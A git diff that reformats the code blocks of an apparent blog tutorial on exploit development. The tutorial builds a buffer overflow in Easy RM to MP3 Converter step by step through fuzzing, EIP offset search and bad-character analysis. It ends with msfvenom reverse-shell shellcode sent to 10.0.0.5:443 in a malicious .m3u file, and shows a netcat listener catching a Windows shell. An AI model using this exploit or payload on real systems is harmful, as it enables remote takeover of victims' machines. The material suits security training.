@@ -47,8 +47,7 @@ Download and install a copy of the Easy RM to MP3 Converter.
 <br />
 Create a python that will create a malicious .m3u file that uses 10000 to crash the program.
 
-{% raw %}
-```python
+{% capture initialcreate %}
 out = 'crash.m3u'
 
 junk = '\x41' * 10000
@@ -56,8 +55,12 @@ with open(out,'w+') as fs:
     fs.write(junk)
     
 print('m3u File Created successfully\n')
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="python"
+   title="mp3_0x00.py"
+   content=initialcreate %}
 
 <br />
 Run the code and produce the malicious .m3u file.
@@ -89,8 +92,7 @@ Load the malicious file that the python script just created.
 <br />
 Update the code to create a bunch of fuzz file trying to find a break point that will overwrite the EIP.
 
-{% raw %}
-```python
+{% capture fuzzfiles %}
 for x in range(10000,50000,5000):
     out = 'crash{sz}.m3u'.format(sz=x)
     junk = '\x41' * x
@@ -98,8 +100,12 @@ for x in range(10000,50000,5000):
         fs.write(junk)
 
 print('m3u Files Created successfully\n')
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="python"
+   title="mp3_0x01.py"
+   content=fuzzfiles %}
 
 <br />
 Run the code and generate all of the possible fuzzing file.
@@ -122,8 +128,7 @@ Load all of the files into the program and notice that the 30000 breaks the prog
 <br />
 Update the code to hardcode the break-point value.
 
-{% raw %}
-```python
+{% capture breakpoint %}
 out = 'crash30000.m3u'
 junk = '\x41' * 30000
 
@@ -131,26 +136,32 @@ with open(out,'w+') as fs:
     fs.write(junk)
 
 print('m3u File Created successfully\n')
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="python"
+   title="mp3_0x02.py"
+   content=breakpoint %}
 
 <br />
 Use msf-pattern_create to generate a pattern than can be used to determine the EIP offset.
 
-{% raw %}
-```bash
+{% capture patterncreate %}
 ┌──(kali㉿kali)-[~]
 └─$ msf-pattern_create -l 30000
 
 <snip>
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=patterncreate %}
 
 <br />
 Update the code to include the patter that was just created by the msf.
 
-{% raw %}
-```python
+{% capture includejunk %}
 out = 'crash30000.m3u'
 # junk = '\x41' * 30000
 
@@ -160,8 +171,12 @@ with open(out,'w+') as fs:
     fs.write(junk)
 
 print('m3u File Created successfully\n')
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="python"
+   title="mp3_0x03.py"
+   content=includejunk %}
 
 <br />
 Run the code and check the bad pattern in the EIP register.
@@ -175,21 +190,23 @@ Run the code and check the bad pattern in the EIP register.
 <br />
 Check it in the msf-pattern_offset and notice that there is no exact match.
 
-{% raw %}
-```bash
+{% capture patteroffset %}
 ┌──(kali㉿kali)-[~]
 └─$ msf-pattern_offset -l 30000 -q 6c48346d
 [*] No exact matches, looking for likely candidates...
 [+] Possible match at offset 5803 (adjusted [ little-endian: 1 | big-endian: 1305601 ] ) byte offset 0
 [+] Possible match at offset 5833 (adjusted [ little-endian: -16777216 | big-endian: -15471616 ] ) byte offset 3
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=patteroffset %}
 
 <br />
 Time to do this 'binary search' style.  Update the code to split the junk string into two separate variables directly in half.  That will 15,000 for the As and 15,000 for the Bs.
 
-{% raw %}
-```python
+{% capture binarysearchstart %}
 out = 'crash30000.m3u'
 junk = '\x41' * 15000
 junk += '\x42' * 15000
@@ -198,8 +215,12 @@ with open(out,'w+') as fs:
     fs.write(junk)
 
 print('m3u File Created successfully\n')
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="python"
+   title="mp3_0x04.py"
+   content=binarysearchstart %}
 
 <br />
 Check the EIP and notice the 42s in the EIP register.
@@ -213,8 +234,7 @@ Check the EIP and notice the 42s in the EIP register.
 <br />
 Update the code to split the Bs (42s) exactly like we did before and Bs and Cs.  That will be 7500 for Bs and 7500 Cs.
 
-{% raw %}
-```python
+{% capture binarysearchsec %}
 out = 'crash30000.m3u'
 junk = '\x41' * 15000
 junk += '\x42' * 7500
@@ -224,8 +244,12 @@ with open(out,'w+') as fs:
     fs.write(junk)
 
 print('m3u File Created successfully\n')
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="python"
+   title="mp3_0x05.py"
+   content=binarysearchsec %}
 
 <br />
 Run it again and check the new value in the EIP register value.
@@ -239,8 +263,7 @@ Run it again and check the new value in the EIP register value.
 <br />
 Continue to update the code continually updating the code, splitting the EIP in half, until you eventually get the exact for characters in the EIP.
 
-{% raw %}
-```python
+{% capture binarysearchlast %}
 out = 'crash30000.m3u'
 junk = '\x41' * 15000
 junk += '\x42' * 7500
@@ -261,8 +284,12 @@ with open(out,'w+') as fs:
     fs.write(junk)
 
 print('m3u File Created successfully\n')
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="python"
+   title="mp3_0x06.py"
+   content=binarysearchlast %}
 
 <br />
 Run the code just to confirm the 50s in the EIP register.
@@ -276,8 +303,7 @@ Run the code just to confirm the 50s in the EIP register.
 <br />
 Update the code to condense the variable into the break, EIP, and rest of the string. Run the code again just to ensure that we still have 42s in the EIP register.
 
-{% raw %}
-```python
+{% capture condensecode %}
 out = 'crash30000.m3u'
 junk = '\x41' * 26083
 junk += '\x42' * 4
@@ -287,14 +313,17 @@ with open(out,'w+') as fs:
     fs.write(junk)
 
 print('m3u File Created successfully\n')
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="python"
+   title="mp3_0x07.py"
+   content=condensecode %}
 
 <br />
 Update the code to include all of the bad chars (exluding the \x00s) to determine the bad characters for the program.
 
-{% raw %}
-```python
+{% capture badchars %}
 badchars = (
   b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
   b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
@@ -324,8 +353,12 @@ with open(out,'wb') as fs:
     fs.write(junk)
 
 print('m3u File Created successfully\n')
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="python"
+   title="mp3_0x08.py"
+   content=badchars %}
 
 <br />
 Run it and check the ESP register.  Notice the first 4 bad chars drop off.
@@ -339,8 +372,7 @@ Run it and check the ESP register.  Notice the first 4 bad chars drop off.
 <br />
 Update the code to include a buffer so the bad chars align with the ESP register.
 
-{% raw %}
-```python
+{% capture alignfix %}
 badchars = (
   b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
   b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
@@ -371,8 +403,12 @@ with open(out,'wb') as fs:
     fs.write(junk)
 
 print('m3u File Created successfully\n')
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="python"
+   title="mp3_0x09.py"
+   content=alignfix %}
 
 <br />
 Run the code again and notice the drop-off at the 09 position.
@@ -386,8 +422,7 @@ Run the code again and notice the drop-off at the 09 position.
 <br />
 Update the code to remove the 09 from the bad chars list.
 
-{% raw %}
-```python
+{% capture removezeronine %}
 # baddies = \x00\x09
 
 badchars = (
@@ -420,8 +455,12 @@ with open(out,'wb') as fs:
     fs.write(junk)
 
 print('m3u File Created successfully\n')
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="python"
+   title="mp3_0x0a.py"
+   content=removezeronine %}
 
 <br />
 Run the code again and notice that there is still a drop-off in the 0a position.
@@ -435,8 +474,7 @@ Run the code again and notice that there is still a drop-off in the 0a position.
 <br />
 Update the code to remove 0a from the bad chars list.
 
-{% raw %}
-```python
+{% capture removezeroa %}
 # baddies = \x00\x09\x0a
 
 badchars = (
@@ -469,9 +507,12 @@ with open(out,'wb') as fs:
     fs.write(junk)
 
 print('m3u File Created successfully\n')
+{% endcapture %}
 
-```
-{% endraw %}
+{% include terminal.html
+   language="python"
+   title="mp3_0x0b.py"
+   content=removezeroa %}
 
 <br />
 Run the code again and notice that we have a clear run on the bad chars list.
@@ -503,15 +544,18 @@ Run !nmod to get a list of the module.  Since there is a bad char in the address
 <br />
 Use the msf-nasm_shell to find the opcodes for jmp esp.
 
-{% raw %}
-```bash
+{% capture nasmshell %}
 ┌──(kali㉿kali)-[~]
 └─$ msf-nasm_shell                         
 nasm > jmp esp
 00000000  FFE4              jmp esp
 nasm >
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=nasmshell %}
 
 <br />
 Search for the system dll address range for a jmp esp command.
@@ -525,8 +569,7 @@ Search for the system dll address range for a jmp esp command.
 <br />
 Update the code to include a stub for the future payload.
 
-{% raw %}
-```python
+{% capture payload %}
 # baddies = \x00\x09\x0a
 
 payload = (
@@ -544,8 +587,12 @@ with open(out,'wb') as fs:
     fs.write(junk)
 
 print('m3u File Created successfully\n')
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="python"
+   title="mp3_0x0c.py"
+   content=payload %}
 
 <br />
 Check the ESP to ensure that the payload is there.  We should see all the 45s.
@@ -559,8 +606,7 @@ Check the ESP to ensure that the payload is there.  We should see all the 45s.
 <br />
 Update the code with the jmp esp address.
 
-{% raw %}
-```python
+{% capture includeaddress %}
 from struct import pack
 
 # baddies = \x00\x09\x0a
@@ -580,8 +626,12 @@ with open(out,'wb') as fs:
     fs.write(junk)
 
 print('m3u File Created successfully\n')
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="python"
+   title="mp3_0x0d.py"
+   content=includeaddress %}
 
 <br />
 Insert a breakpoint in WinDBG to test the address that we just captured.
@@ -604,8 +654,7 @@ Catch the breakpoint and notice the jmp command.
 <br />
 Use msfvenom to generate a shellcode.
 
-{% raw %}
-```bash
+{% capture generatepayload %}
 ┌──(kali㉿kali)-[~]
 └─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.5 LPORT=443 ExitFunc=thread -f python -b '\x00\x09\x0a' -v payload
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
@@ -649,14 +698,17 @@ payload += b"\x7e\xb7\x6c\xa3\x4f\x5f\x79\xdc\xad\xff\x86"
 payload += b"\x37\x76\x1f\x65\x9d\x83\x88\x30\x74\x2e\xd5"
 payload += b"\xc2\xa3\x6d\xe0\x40\x41\x0e\x17\x58\x20\x0b"
 payload += b"\x53\xde\xd9\x61\xcc\x8b\xdd\xd6\xed\x99"
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=generatepayload %}
 
 <br />
 Update the code with the msfvenom code.
 
-{% raw %}
-```bash
+{% capture addfullpayload %}
 from struct import pack
 
 # baddies = \x00\x09\x0a
@@ -707,37 +759,55 @@ with open(out,'wb') as fs:
     fs.write(junk)
 
 print('m3u File Created successfully\n')
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="python"
+   title="mp3_0x0e.py"
+   content=addfullpayload %}
 
 <br />
 Start a netcat listener.
 
-{% raw %}
-```bash
+{% capture startlistener %}
 ┌──(kali㉿kali)-[~]
 └─$ sudo nc -nlvp 443                         
 [sudo] password for kali: 
 listening on [any] 443 ...
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=startlistener %}
 
 <br />
 Execute the code and catch the shell.
 
-{% raw %}
-```bash
+{% capture catchshell %}
 ┌──(kali㉿kali)-[~]
 └─$ sudo nc -nlvp 443                         
 [sudo] password for kali: 
 listening on [any] 443 ...
 connect to [10.0.0.5] from (UNKNOWN) [10.0.0.6] 51440
+{% endcapture %}
+
+{% capture windowsprompt %}
 Microsoft Windows [Version 10.0.19045.6093]
 (c) Microsoft Corporation. All rights reserved.
 
 C:\Program Files\Easy RM to MP3 Converter>
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=catchshell %}
+
+{% include terminal.html
+   language="cmd"
+   title="cmd.exe"
+   content=windowsprompt %}
 
 <br />
 And there is our trophy!
